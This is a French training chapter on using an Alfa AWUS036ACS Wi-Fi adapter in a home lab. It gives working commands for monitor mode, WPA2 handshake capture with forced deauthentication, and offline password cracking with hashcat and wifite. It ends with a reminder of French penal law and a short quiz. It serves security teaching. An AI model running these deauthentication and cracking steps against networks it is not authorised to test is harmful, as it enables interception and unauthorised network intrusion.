---
title: 3.13 Carte Wi-Fi Alfa AWUS036ACS
description: Configuration de la carte Wi-Fi externe Alfa AWUS036ACS pour pentest et forensic - mode monitor, injection de paquets, capture de handshake WPA2, drivers Realtek RTL8812AU.
authors:
  - Zyrass
date:
  created: 2026-04-29
tags:
  - Wi-Fi
  - Alfa
  - Mode monitor
  - Realtek
data-level: 🔴
---

# 3.13 Carte Wi-Fi Alfa AWUS036ACS

## Métadonnées

| Champ | Valeur |
|---|---|
| Durée | 2 heures |
| Niveau | Pratique |

## 1. Pourquoi Alfa AWUS036ACS

| Critère | Valeur |
|---|---|
| Chipset | Realtek RTL8812AU |
| Bandes | 2.4 GHz + 5 GHz |
| Mode monitor | Oui |
| Injection | Oui |
| Linux drivers | Stables |
| Antenne | Externe haute portée |
| Prix | 40-60 € |

## 2. Installation des drivers

### 2.1 Sur Kali Linux (préinstallé en général)

```bash
# Vérifier
sudo apt search rtl8812au
sudo apt install realtek-rtl88xxau-dkms -y
```

### 2.2 Sur Debian / Ubuntu

```bash
# Dépendances
sudo apt install -y dkms build-essential git linux-headers-$(uname -r)

# Cloner driver Aircrack-ng
git clone https://github.com/aircrack-ng/rtl8812au.git
cd rtl8812au

# Compilation et installation
sudo make dkms_install

# Reboot recommandé
sudo reboot
```

### 2.3 Vérification

```bash
# Brancher la carte Alfa
lsusb | grep Realtek
# Bus 003 Device 005: ID 0bda:8812 Realtek Semiconductor Corp. RTL8812AU

# Interface
iwconfig
# wlan1     unassociated  Nickname:""
#           Mode:Auto    Frequency=2.412 GHz
```

## 3. Mode monitor

### 3.1 Activation

```bash
# Tuer les processus qui interfèrent
sudo airmon-ng check kill

# Mettre en mode monitor
sudo airmon-ng start wlan1

# Vérification
iwconfig
# wlan1mon  Mode:Monitor  Frequency=2.412 GHz
```

### 3.2 Méthode alternative (sans airmon-ng)

```bash
sudo ip link set wlan1 down
sudo iw wlan1 set monitor control
sudo ip link set wlan1 up
```

### 3.3 Sortir du mode monitor

```bash
sudo airmon-ng stop wlan1mon

# Ou
sudo ip link set wlan1 down
sudo iw wlan1 set type managed
sudo ip link set wlan1 up
```

## 4. Test scan passif

```bash
# Scan canal 6 (par défaut Wi-Fi 2.4 GHz)
sudo airodump-ng wlan1mon

# Cibler ARTECH-WIFI uniquement
sudo airodump-ng wlan1mon --essid ARTECH-WIFI
```

Vous devriez voir le BSSID de votre routeur (l'Archer C7 du labo) et la liste des clients connectés.

## 5. Capture de handshake WPA2

C'est l'opération clé pour casser le mot de passe Wi-Fi.

```bash
# Lancer capture sur le canal et BSSID identifiés
sudo airodump-ng wlan1mon \
    --bssid AA:BB:CC:DD:EE:FF \
    --channel 6 \
    --write artech_capture

# Dans un autre terminal, forcer une déconnexion d'un client
sudo aireplay-ng wlan1mon \
    --deauth 5 \
    -a AA:BB:CC:DD:EE:FF \
    -c CC:CC:CC:CC:CC:CC

# Le client va se reconnecter, capturant le handshake
# Voir "WPA handshake: AA:BB:CC:DD:EE:FF" dans airodump
```

## 6. Cassage offline avec hashcat

### 6.1 Conversion en format hashcat

```bash
# Conversion .cap → .hccapx (hashcat)
hcxpcapngtool -o artech.hc22000 artech_capture-01.cap

# Note : .hc22000 est le format moderne (hashcat 6+)
```

### 6.2 Cassage

```bash
# Avec rockyou.txt
hashcat -m 22000 artech.hc22000 /usr/share/wordlists/rockyou.txt

# Avec dictionnaire ciblé
hashcat -m 22000 artech.hc22000 artech_dict.txt

# Mode masque (8 caractères majuscule + 4 chiffres)
hashcat -m 22000 artech.hc22000 -a 3 ?u?l?l?l?l?l?l?l?d?d?d?d
```

### 6.3 Affichage résultat

```bash
hashcat -m 22000 artech.hc22000 --show
```

Résultat attendu : `BSSID:CLIENT_MAC:SSID:PASSWORD`

## 7. Wifite - Automation

```bash
# Wifite automatise tout le processus
sudo wifite --kill --dict /usr/share/wordlists/rockyou.txt
```

## 8. Forensic Wi-Fi

### 8.1 Captures comme preuves

Les fichiers `.cap` ou `.pcapng` peuvent être analysés en forensic :

```bash
# Wireshark
wireshark artech_capture-01.cap

# Filtrage handshakes
# Filter : eapol
```

### 8.2 Identification de clients connectés

```bash
# Lister adresses MAC vues
tshark -r artech_capture-01.cap -T fields -e wlan.sa | sort -u
```

## 9. Sécurité et précautions

```text
RAPPEL CRITIQUE
================

Le mode monitor + injection est un superpouvoir
qui ne s'utilise QUE sur votre propre réseau.

ARTICLES PÉNAUX :
  Article 226-3 du Code pénal : interception
    correspondances (article 226-15 + L.871-1)
  Articles 323-1 à 323-7 : intrusion réseau

PEINES :
  226-15 : 1 an / 45 000 €
  323-2 : 5 ans / 150 000 €

VOTRE LABO uniquement.
JAMAIS AUTRES Wi-Fi sans autorisation écrite.
```

## 10. Auto-évaluation

| # | Question | Réponse |
|---|---|---|
| 1 | Chipset Alfa AWUS036ACS ? | Realtek RTL8812AU |
| 2 | Activer mode monitor ? | `airmon-ng start wlan1` |
| 3 | Capture WPA2 ? | airodump-ng + aireplay-ng deauth |
| 4 | Format hashcat WPA2 ? | hc22000 (mode 22000) |
| 5 | Article pénal interception ? | 226-15 |

---

**Chapitre suivant** : [3.14 Write-blocker matériel](03-14-write-blocker.md)
